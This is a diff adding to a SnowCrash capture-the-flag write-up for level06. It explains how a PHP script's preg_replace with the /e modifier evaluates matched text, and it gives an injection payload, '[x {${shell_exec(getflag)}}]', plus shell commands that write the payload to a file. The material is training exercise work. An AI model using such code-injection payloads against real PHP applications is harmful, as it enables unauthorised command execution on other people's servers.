@@ -30,3 +30,18 @@ function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\]
 $r = x($argv[1], $argv[2]); print $r;
 ?>
 ```
+
+## regex and shell_exec
+reg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
+
+regex : (\[x (.*)\])
+
+#To match the regex our string must start by "[x" and finish by "]"
+
+[x {${shell_exec(getflag)}}]
+
+## make file 
+```zsh
+level06@SnowCrash:~$ mkdir /tmp/level06
+level06@SnowCrash:~$ echo '[x {${shell_exec(getflag)}}]' > /tmp/level06/flag06
+```
